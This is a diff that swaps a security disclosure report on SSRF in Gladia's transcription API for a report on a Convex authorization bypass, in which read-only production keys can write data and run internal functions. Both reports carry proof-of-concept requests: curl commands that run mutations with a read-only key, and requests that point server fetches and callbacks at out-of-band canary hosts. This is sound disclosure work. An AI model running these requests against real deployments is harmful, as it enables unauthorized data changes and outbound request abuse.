@@ -1,213 +1,236 @@
-# Server-Side Request Forgery (SSRF) — `audio_url` and `callback_config.url`
+# Convex Platform Security Report — Read-only deployment identity can modify data and run internal functions
 
-## Summary
+**Reporter:** Auditify Security (info@auditifysecurity.com)
+**Date:** 2026-09-17
+**Vendor / product:** Convex (convex.dev) — reactive backend-as-a-service; open-source backend `github.com/get-convex/convex-backend`
+**Disclosure:** Private, per Convex VDP (`security@convex.dev`). No public disclosure until fixed.
+**Method:** Static source audit of the public backend + live documentation verification. Code paths cited by `file:line` against the current `main` of `get-convex/convex-backend`.
 
-The Gladia pre-recorded transcription API performs server-side HTTP requests to URLs supplied by an
-authenticated client, and those requests reach arbitrary attacker-controlled external hosts. Two request
-parameters were independently confirmed to trigger an outbound request from Gladia's backend
-infrastructure to a tester-controlled out-of-band (OOB) canary:
+---
 
-- `audio_url` — the backend issues a server-side **GET** to the supplied URL.
-- `callback_config.url` — on job completion the backend issues a server-side **POST** (containing the
-  job result JSON) to the supplied URL.
+## 1. Summary
 
-Both interactions were observed on two independent tester-controlled OOB services (webhook.site and Burp
-Collaborator), originating from OVH-hosted IP addresses consistent with Gladia's EU infrastructure.
+Convex documents that, **on production deployments, a Team Developer who is not also a Project Admin receives a "read-only deployment identity"** and may modify data or run mutations *"only on non-production deployments."* The role model marks `deployment:data:write`, `deployment:functions:runInternalMutations`, and `deployment:functions:runInternalActions` as non-production only.
 
-Scope note on impact: direct requests to loopback, link-local (`169.254.169.254`), and RFC1918 targets
-were rejected quickly in earlier testing (pre-connection filtering), so internal/metadata access was
-**not** achieved and is **not** claimed here. This report documents confirmed SSRF to arbitrary external
-destinations.
+In the backend, that read-only restriction is enforced **only** on a subset of endpoints (the dashboard data-editor and a handful of management routes) via `Identity::require_operation`. The **function-execution surface — `POST /api/mutation`, `POST /api/function`, `POST /api/run/{path}`, and the WebSocket sync "Mutation" message — performs no such check.** These paths never consult the identity's `is_read_only` flag or require `data:write` / `runInternalMutations`. Internal functions are additionally gated only on `identity.is_admin()`, which is **true for a read-only admin identity**.
 
-## Severity
+**Net effect:** any principal holding a read-only production identity (the *default* role for a non-admin team member, plus deliberately read-only contractors / CI keys) can **write and delete arbitrary production data and execute internal mutations and actions** (which can call external services via `fetch`, send email, spend money, etc.) — a direct contradiction of the platform's documented authorization guarantee.
 
-Medium.
+- **Severity:** High — **CVSS:3.1 8.8** (`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`)
+- **Class:** CWE-863 Incorrect Authorization (also CWE-285 Improper Authorization, CWE-284 Improper Access Control)
+- **Boundary broken:** platform-issued credential/role **scope** (management plane). This is the top-priority test in a multi-tenant BaaS threat model ("read-only → read-write escalation").
 
-Estimated CVSS 3.1: `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N` ≈ 5.4. Rationale: any authenticated Gladia
-customer can coerce the backend into sending GET/POST requests to arbitrary external hosts; internal
-resource access was not demonstrated (obvious internal ranges appear filtered). Final rating is the
-program's to set.
+---
 
-## Affected Asset
+## 2. Affected surface
 
-- URL: `https://api.gladia.io/v2/pre-recorded`
-- Endpoint: `POST /v2/pre-recorded` (job creation)
-- Parameters (two attack surfaces of the same SSRF class):
-  - `audio_url` (string) → server-side GET
-  - `callback_config.url` (string, with `callback: true`) → server-side POST on completion
-- HTTP Method: POST (to create the job); the SSRF request itself is GET (audio_url) / POST (callback)
-- Functionality: URL-based audio ingestion, and job-completion webhook callback
+| Path | Handler | File |
+|------|---------|------|
+| `POST /api/mutation` | `public_mutation_post` | `crates/local_backend/src/public_api.rs:661` |
+| `POST /api/function` | `public_function_post` | `crates/local_backend/src/public_api.rs:215` |
+| `POST /api/run/{path}` | `public_function_post_with_path` | `crates/local_backend/src/public_api.rs:287` |
+| WebSocket `Mutation` msg | sync worker mutation branch | `crates/sync/src/worker.rs:707` |
+| `POST /api/run_test_function` | `run_test_function` (related; see §7) | `crates/local_backend/src/dashboard.rs:298` |
 
-## Vulnerability Description
+All are served by `local_backend`, which backs **both** Convex Cloud (behind the closed-source Usher proxy) and **self-hosted** deployments (no proxy). Self-hosted is unambiguously affected.
 
-Gladia supports transcribing audio from a URL and notifying a caller-supplied callback URL when a job
-finishes. In both cases the backend performs the outbound HTTP request itself. Testing confirmed the
-backend will connect to arbitrary attacker-chosen **external** hosts with no allowlist restricting the
-destination, no authentication of the requester's ownership of the target, and (for callbacks) no request
-signature. This is Server-Side Request Forgery: the request originates from Gladia's trusted network
-position rather than the attacker's, and the destination is fully attacker-controlled.
+---
 
-Observed facts vs. assumptions:
-- Observed: server-side GET to the tester `audio_url` canary (two OOB services, multiple OVH source IPs).
-- Observed: server-side POST to the tester `callback_config.url` canary carrying the job result JSON,
-  `Content-Type: application/json`, `User-Agent: axios/1.18.1`, and **no signature/authentication header**.
-- Observed (earlier, timing/encoding/DNS tests): loopback/link-local/RFC1918 and metadata hostnames are
-  rejected quickly (pre-connection filtering) — internal access not achieved.
-- Not established from available evidence: whether the fetcher follows HTTP redirects to a new host
-  without re-validating the destination (a common filter-bypass path to internal resources). Not tested,
-  per assessment scope (no redirect toward internal/metadata).
+## 3. Preconditions (attacker starting state)
 
-## Preconditions
+The attacker holds a **read-only deployment identity** for a **production** deployment. Realistic sources:
 
-- A valid Gladia API key (any authenticated customer account).
+- A **Team Developer** who is not a Project Admin — per docs, the *default* read-only identity on production. This is an ordinary engineer on the team.
+- A collaborator/contractor deliberately given read-only access to inspect data/logs.
+- A read-only key issued for CI, analytics, or a support tool.
 
-## Steps to Reproduce
+The read-only admin key is the credential the dashboard/CLI already uses (`Authorization: Convex <key>`); the holder can read it from local CLI state or a dashboard request.
 
-### Surface 1 — `audio_url`
-1. Authenticate with a valid Gladia API key.
-2. Send `POST /v2/pre-recorded` with `{"audio_url": "https://<TESTER-OOB>/audio-url-test"}`.
-3. Observe a server-side **GET** to `<TESTER-OOB>/audio-url-test` in the OOB service.
+---
 
-### Surface 2 — `callback_config.url`
-1. Authenticate with a valid Gladia API key.
-2. Upload a small valid audio file via `POST /v2/upload` to obtain a working `audio_url`.
-3. Send `POST /v2/pre-recorded` with:
-   `{"audio_url": "<uploaded>", "callback": true, "callback_config": {"url": "https://<TESTER-OOB>/callback-test", "method": "POST"}}`.
-4. Wait for the job to reach `done`.
-5. Observe a server-side **POST** to `<TESTER-OOB>/callback-test` in the OOB service, carrying the result JSON.
+## 4. Root cause (code walk-through)
 
-## Proof of Concept
+### 4.1 Read-only is a `DeploymentOp` set enforced only via `require_operation`
+A read-only key carries a reduced operation set inside its **authenticated** (AES-128-GCM-SIV) blob:
 
-API key redacted. OOB URLs are tester-controlled. Job/file IDs belong to the tester's own account.
-
-Surface 1 request:
-
-```http
-POST /v2/pre-recorded HTTP/2
-Host: api.gladia.io
-x-gladia-key: sk_gladia_REDACTED
-Content-Type: application/json
-
-{"audio_url":"https://webhook.site/<TESTER-UUID>/audio-url-test"}
+```rust
+// crates/keybroker/src/operations.rs
+pub fn operations_for_deploy_key(is_read_only: bool) -> Vec<DeploymentOp> {
+    if is_read_only { read_only_operations() } else { vec![] } // empty == all allowed
+}
+pub fn read_only_operations() -> Vec<DeploymentOp> {
+    vec![ ViewEnvironmentVariables, ViewLogs, ViewMetrics, ViewIntegrations,
+          ViewData, ViewBackups, DownloadBackups, RunInternalQueries,
+          RunTestQuery, ViewAuditLog, ViewUsageLimits, ViewUsage ]
+    // NOTE: deliberately EXCLUDES WriteData, RunInternalMutations, RunInternalActions
+}
 ```
 
-Surface 2 request:
+Enforcement is centralized in one method:
 
-```http
-POST /v2/pre-recorded HTTP/2
-Host: api.gladia.io
-x-gladia-key: sk_gladia_REDACTED
-Content-Type: application/json
-
-{"audio_url":"https://api.gladia.io/file/c91843be-f22b-4229-bde9-a6b716fdaa46",
- "callback":true,
- "callback_config":{"url":"https://webhook.site/<TESTER-UUID>/callback-test","method":"POST"}}
+```rust
+// crates/roles/src/eval.rs:283
+fn require_operation(&self, operation: DeploymentOp) -> anyhow::Result<()> {
+    let admin_identity = match self {
+        Identity::System(_) => return Ok(()),
+        Identity::DeploymentAdmin(a) | Identity::ActingUser(a, _) => a,
+        Identity::User(_) | Identity::Unknown(_) => return Err(bad_admin_key_error(...)),
+    };
+    if !admin_identity.is_operation_allowed(operation)? { bail!(forbidden("OperationNotPermitted", ...)); }
+    Ok(())
+}
 ```
 
-Surface 2 response:
+The intent that read-only blocks **data writes** is proven by the dashboard **data-editor**, which does call it:
 
-```http
-HTTP/2 201
-{"id":"d77b9fd7-089b-4490-b558-d62005e8af57","result_url":"https://api.gladia.io/v2/pre-recorded/d77b9fd7-089b-4490-b558-d62005e8af57"}
+```rust
+// crates/local_backend/src/dashboard.rs
+identity.require_operation(keybroker::DeploymentOp::WriteData)?;   // :157, :184  (document add/update/delete)
 ```
 
-## OOB Evidence
+### 4.2 The function-execution path enforces nothing
+`POST /api/mutation`:
 
-Surface 1 — `audio_url` (GET):
-- Interaction received: **Yes** (two independent OOB services)
-- HTTP method: GET
-- webhook.site: `2026-09-16 16:44:01 UTC`, path `/audio-url-test`, source IP `51.91.142.116` (OVH, FR), User-Agent: none
-- Burp Collaborator: `2026-09-16 16:43:58–16:44:00 UTC`, HTTP GET `/audio-url-test`, source IPs `51.178.58.138` and `91.134.55.10` (OVH, FR), preceded by DNS A-record lookups of the canary hostname
-- Relevant headers (Collaborator, decoded): `GET /audio-url-test HTTP/1.1` / `accept: */*` / `host: <canary>.oastify.com`
-- Source information: OVH-hosted IPs (France), consistent with Gladia's EU infrastructure and the same
-  provider/region as the confirmed storage host `s3.gra.perf.cloud.ovh.net`
+```rust
+// crates/local_backend/src/public_api.rs:661  public_mutation_post
+let identity = st.api.authenticate(&host, ctx, auth_token).await?;   // read-only DeploymentAdmin
+let udf_result = st.api.execute_public_mutation(&host, ctx, identity, export_path, args, ...).await?;
+// no require_operation, no is_read_only check
+```
 
-Surface 2 — `callback_config.url` (POST):
-- Interaction received: **Yes** (webhook.site)
-- HTTP method: POST
-- Timestamp: `2026-09-16 16:45:22 UTC`, path `/callback-test`
-- Source IP: `5.196.147.101` (OVH, FR)
-- User-Agent: `axios/1.18.1`
-- Content-Type: `application/json`; Content-Length: 275
-- Authentication/signature headers present: **No** (no `x-gladia-signature`, HMAC, or bearer token)
-- Body (tester's own job result):
-  `{"id":"d77b9fd7-...","event":"transcription.success","payload":{"metadata":{...},"transcription":{"full_transcript":""}}}`
+```rust
+// crates/application/src/api.rs:343  execute_public_mutation
+self.mutation_udf(ctx, PublicFunctionPath::RootExport(path), args, identity, ...).await
+```
 
-## Expected Behavior
+```rust
+// crates/application/src/lib.rs:1323  mutation_udf  -> retry_mutation
+//   no require_operation / is_read_only anywhere on this path
+// crates/application/src/application_function_runner/mod.rs:884  retry_mutation
+//   only identity gate:  if path.is_system() && !(identity.is_admin() || identity.is_system()) { deny }
+```
 
-Server-side fetches (audio ingestion and callbacks) should be constrained to prevent the backend from
-being used as a request proxy: destinations validated against policy, internal ranges blocked at every
-hop including redirects, and callbacks authenticated with a verifiable signature.
+The mutation commits. `is_read_only` is **never** read in the data plane (verified by grep: the flag is consulted only inside `require_operation` and to render dashboard "disabled states").
 
-## Actual Behavior
+### 4.3 Internal functions are reachable because the gate is `is_admin()`
+`POST /api/function` / `/api/run` → `execute_any_function` → `any_udf`:
 
-The backend issues server-side GET (`audio_url`) and POST (`callback_config.url`) requests to arbitrary
-attacker-controlled external hosts, and the callback carries application-generated result data with no
-signature.
+```rust
+// crates/application/src/lib.rs:1550  (inside any_udf function resolution)
+.filter(|af| (identity.is_admin() || af.visibility == Some(Visibility::Public))
+             && af.udf_type != UdfType::HttpAction)
+```
 
-## Security Impact
+```rust
+// crates/keybroker/src/broker.rs:355
+pub fn is_admin(&self) -> bool { matches!(self, Identity::DeploymentAdmin(..)) } // read-only-agnostic
+```
 
-Demonstrated: an authenticated attacker can coerce Gladia's backend into sending arbitrary GET requests
-(via `audio_url`) and POST requests carrying job data (via `callback_config.url`) to any external host of
-their choosing, from Gladia's trusted network egress. This enables using Gladia as an outbound request
-proxy (e.g., to interact with third-party endpoints while masking the true origin behind Gladia's IPs),
-and the unsigned callback means a receiver cannot cryptographically attribute the callback to Gladia.
+A read-only admin satisfies `is_admin()`, so **internal** mutations/actions are selectable and then executed — even though `RunInternalMutations`/`RunInternalActions` are supposed to be denied. Those two ops are defined in the role system (`crates/roles/src/types.rs:1019+`) but are **enforced on no endpoint** (only `RunTestQuery` is, at `dashboard.rs:311`).
 
-Not demonstrated (and not claimed): access to cloud metadata, loopback, or internal RFC1918 services —
-direct attempts to those targets were filtered. Escalation to internal access would require the fetcher
-to follow redirects to internal hosts without re-validation, which was not tested under this assessment's
-rules.
+### 4.4 Why the "read-only" label is effectively UI-only
+The backend advertises read-only status to the client precisely so the dashboard can grey out buttons:
 
-## Attack Scenario
+```rust
+// crates/local_backend/src/dashboard.rs:236  (doc comment on check_admin_key)
+// "Returns the allowed operations and read-only status for the key so the
+//  dashboard can show appropriate disabled states."
+```
 
-An authenticated customer submits `audio_url`/`callback_config.url` values pointing at an external system
-they wish to reach indirectly. Gladia's backend performs the request from its OVH egress IPs, so the
-target sees the traffic as originating from Gladia rather than the attacker. Because callbacks are
-unsigned, an attacker who can influence a victim integration's callback endpoint configuration could also
-deliver forged-looking `transcription.success` payloads that the victim cannot distinguish from genuine
-Gladia callbacks.
+Anything that bypasses the dashboard UI (the CLI, `curl`, the WebSocket sync path) is unrestricted on the data plane.
 
-## Root Cause
+---
 
-Server-side URL retrieval without a destination allowlist. Internal-range filtering exists for directly
-supplied hosts, but arbitrary external destinations are permitted, and callback requests are dispatched
-without a signing mechanism. If redirect destinations are not re-validated, the existing internal filter
-could be bypassed (unverified).
+## 5. Reproduction
 
-## Remediation
+A turnkey PoC is included (`run_poc.sh`, `convex/poc.ts`, `README.md`). Summary:
 
-- Restrict outbound requests to an explicit allowlist of trusted destinations where feasible.
-- Validate URLs after canonicalization; reject non-audio schemes early.
-- Re-validate every redirect destination against the same policy (block private/loopback/link-local/reserved).
-- Resolve DNS safely and pin the resolved address for the connection to prevent DNS-rebinding bypasses.
-- Apply network-level egress controls around the fetcher/callback workers.
-- Sign callbacks (e.g., HMAC over the body with a per-account secret and a timestamp) so receivers can
-  verify authenticity, and avoid sending unnecessary data to attacker-controlled callback URLs.
+1. Deploy `convex/poc.ts` (public `writeMarker`, internal `internalWriteMarker`, query `countMarkers`, `cleanup`) to a deployment you own.
+2. Obtain a **read-only** identity — a Team-Developer-on-production key, or a self-hosted `issue_read_only_admin_key`.
+3. Confirm read-only: `GET /api/check_admin_key` → `{"isReadOnly": true, "allowedOps": [ …no WriteData/RunInternalMutations… ]}`.
+4. Exploit A — public mutation:
+   ```bash
+   curl -s -X POST "$URL/api/mutation" -H "Authorization: Convex $RO_KEY" \
+     -H 'Content-Type: application/json' \
+     -d '{"path":"poc:writeMarker","args":{"note":"ro"},"format":"json"}'
+   # Expected per docs: 403 OperationNotPermitted.  Actual: 200 + a row inserted.
+   ```
+5. Exploit B — internal mutation:
+   ```bash
+   curl -s -X POST "$URL/api/function" -H "Authorization: Convex $RO_KEY" \
+     -H 'Content-Type: application/json' \
+     -d '{"path":"poc:internalWriteMarker","args":{"note":"ro"},"format":"json"}'
+   # Actual: 200, internal mutation executed.
+   ```
+6. Evidence: `POST /api/query {"path":"poc:countMarkers",...}` shows the count increased. `run_poc.sh` prints a `VULNERABLE` verdict (exit 1) and cleans up.
 
-## Evidence
+**Reproduction status:** code-confirmed end-to-end via static analysis. Live confirmation requires the reporter's own authorized deployment + a read-only key (the PoC automates it). The single residual question — whether Convex Cloud's closed-source Usher proxy independently strips read-only keys from `/api/*` — is resolved by running the PoC against a **self-hosted** instance (no proxy), which exercises this exact code.
 
-- webhook.site inbox JSON: GET `/audio-url-test` from `51.91.142.116`; POST `/callback-test` from
-  `5.196.147.101` with result body and no signature header (captured 2026-09-16).
-- Burp Collaborator export (`output/ping`): DNS + HTTP GET `/audio-url-test` interactions from
-  `51.178.58.138`, `91.134.55.10` (2026-09-16 16:43–16:44 UTC).
-- Job created for callback test: `d77b9fd7-089b-4490-b558-d62005e8af57` (tester account).
-- Test scripts: `scratchpad/ssrf_oob.py`, `scratchpad/cb.py`.
+---
 
-## Verification Status
+## 6. Impact — what disaster
 
-**Confirmed — Genuine Security Vulnerability**
+- **Integrity/Confidentiality/Availability of production data:** a read-only principal can insert, overwrite, and delete arbitrary documents in the production database via public mutations, and via internal mutations reach functions the developer never exposed publicly.
+- **Side-effecting internal actions:** internal *actions* run in the action runtime with `fetch`, secrets/env access, and the scheduler — so the escalation extends to sending email, calling third-party/paid APIs, and enqueuing background work as the deployment.
+- **Blast radius:** every deployment that has at least one non-admin Team Developer (the common case) or any read-only collaborator/CI key. The "read-only" guarantee that teams rely on to safely grant production visibility is void.
+- **Trust-model inversion:** the feature exists specifically to let an organization grant *look-but-don't-touch* access to production; this bug turns every such grant into full data write + internal execution.
 
-## Testing Scope
+---
 
-Testing was performed using only the authorized tester account and tester-controlled OOB infrastructure
-(webhook.site and Burp Collaborator). No third-party sensitive data was intentionally accessed or
-transmitted; the only data sent to the callback canary was the tester's own job result. No internal,
-metadata, or RFC1918 targets were accessed.
+## 7. Related / secondary observations
 
-## Notes
+- **`run_test_function` (`dashboard.rs:298`)** gates only on `RunTestQuery` (which read-only holds) yet executes an arbitrary bundled module — including mutation modules — via `execute_standalone_module`. Same class as the primary finding; likely the same fix (gate on the resolved UDF type).
+- **Debug prints** in the request handlers leak request paths to stdout logs: `println!("{path:?}")` / `println!("{path_parts:?}")` in `public_function_post_with_path` (`public_api.rs`). Informational; remove before release.
 
-- The missing callback signature is a related but distinct weakness (webhook authenticity); it is
-  documented here as part of the callback attack surface and may warrant a separate report.
-- Internal-range access appears filtered; the highest-impact escalation (redirect/DNS-rebinding to
-  internal/metadata) remains unproven and would need explicit authorization to test safely.
-- Multiple distinct OVH source IPs were observed, suggesting a pool of fetcher/callback workers.
+---
+
+## 8. Remediation
+
+Enforce the documented role actions on the data plane, mirroring the dashboard editor:
+
+1. In `execute_public_mutation`, `execute_admin_mutation`, and the mutation branch of the sync worker, call `identity.require_operation(DeploymentOp::WriteData)?` before dispatch.
+2. In `any_udf` (and `execute_public_action`/`execute_admin_action`), when the resolved `AnalyzedFunction` is **internal**, require `RunInternalMutations` / `RunInternalActions` (by `udf_type`); when it is a public mutation, require `WriteData`. Do **not** use `identity.is_admin()` as the sole gate for selecting internal functions.
+3. Actually consult `admin_identity.is_read_only()` (or the op set) in the write path rather than relying on the client to disable UI.
+4. Add regression tests: a read-only identity must receive `403 OperationNotPermitted` from `/api/mutation`, `/api/function`, `/api/run`, and the WS `Mutation` message for both public and internal mutations/actions.
+
+---
+
+## 9. Disclosure note (draft to security@convex.dev)
+
+> **Subject:** Broken authorization — read-only production identities can write data and run internal functions
+>
+> Convex documents that a Team Developer on a production deployment gets a read-only deployment identity and may modify data / run mutations only on non-production deployments (`docs.convex.dev/team-management/role-actions`). However, `POST /api/mutation`, `/api/function`, `/api/run/{path}`, and the WebSocket Mutation message execute functions without enforcing `data:write` / `runInternalMutations`. `mutation_udf` → `retry_mutation` never consult `is_read_only`; internal functions are gated only on `identity.is_admin()`, which is true for read-only admin identities. Read-only enforcement exists only on the dashboard data-editor (`require_operation(WriteData)`), so the CLI/HTTP/WS function paths bypass it.
+>
+> **Impact:** any read-only production collaborator (the default for a non-admin Team Developer) gains full read/write/delete of production data plus execution of internal mutations and actions. CVSS 3.1 8.8 (High).
+>
+> A turnkey PoC (deploy a sample module, invoke it with a read-only key, observe the write) and file:line references to the affected paths are attached. Happy to coordinate on a fix window.
+
+---
+
+## Appendix A — Rejected-candidate log (zero-false-positive discipline)
+
+| Candidate | Surface | Why killed | By-design? | App vs platform | Evidence |
+|---|---|---|---|---|---|
+| JWT alg-confusion (`none`/HS256, RS↔HS) | Auth §5.3 | CustomJwt pins alg from config `decode_with_jwks(&jwks, Some(algorithm))`; OIDC `set_allowed_algs([RS256, EdDSA])` | correct | platform (secure) | `crates/authentication/src/lib.rs` |
+| Issuer→wrong-provider routing | Auth §5.3 | `matches_token` requires exact normalized `iss == domain`; mis-routed token fails signature | correct | platform (secure) | `crates/common/src/auth.rs` |
+| JWKS / OIDC-discovery SSRF via issuer (error reflects response body) | Auth/Runtime §5.2–5.3 | All provider fetches go through `build_proxied_reqwest_client` (Smokescreen); `407` treated as SSRF block. Self-hosted w/o proxy = operator-scoped, not cross-tenant | partly by-design | cloud-defended / operator | `crates/http_client/src/lib.rs`, `crates/common/src/http/fetch.rs` |
+| Read-only → RW via blob tamper | Mgmt §5.4 | Read-only op set lives inside AES-128-GCM-SIV authenticated blob; tampering fails auth tag | correct | platform (secure) | `crates/keybroker/src/broker.rs` |
+| `internal` function callable by unauth client | Runtime §5.2 | SyncWorker/HttpApi callers = `PublicOnly`; non-admin identity cannot select internal (`any_udf` filter) | correct for non-admin | platform (secure) | `crates/common/src/types/functions.rs:286`, `lib.rs:1550` |
+
+## Appendix B — Coverage map
+
+- **Deep / tested:** OIDC + custom-JWT verification; admin-key crypto & read-only scope; public/internal function boundary; **read-only data-plane enforcement (this finding).**
+- **Partial:** JWKS / action-`fetch` SSRF (cloud proxy-defended; self-hosted operator-scoped).
+- **Not yet reached:** cross-deployment routing / Host-header confusion at the edge; storage-ID predictability & cross-deployment file fetch; dashboard IDOR (closed-source, needs live accounts); sync-protocol / Convex-value decoder (prototype pollution); streaming export/import authz across projects; deploy-key over-scope.
+
+## Appendix C — Evidence index (file:line)
+
+- `crates/local_backend/src/public_api.rs:215,287,661` — ungated function-execution handlers
+- `crates/application/src/api.rs:343` — `execute_public_mutation` (no op check)
+- `crates/application/src/lib.rs:1323,1519,1550` — `mutation_udf`, `any_udf`, `is_admin()` internal gate
+- `crates/application/src/application_function_runner/mod.rs:884` — `retry_mutation` (only system-path gate)
+- `crates/keybroker/src/operations.rs` — `read_only_operations()` (excludes writes)
+- `crates/keybroker/src/broker.rs:355` — `is_admin()` read-only-agnostic
+- `crates/roles/src/eval.rs:283` — `require_operation` (the only enforcement point)
+- `crates/local_backend/src/dashboard.rs:157,184,311,236` — data-editor `WriteData` gate; `RunTestQuery`; UI-only comment
+- `crates/sync/src/worker.rs:707` — WebSocket mutation path (no op check)
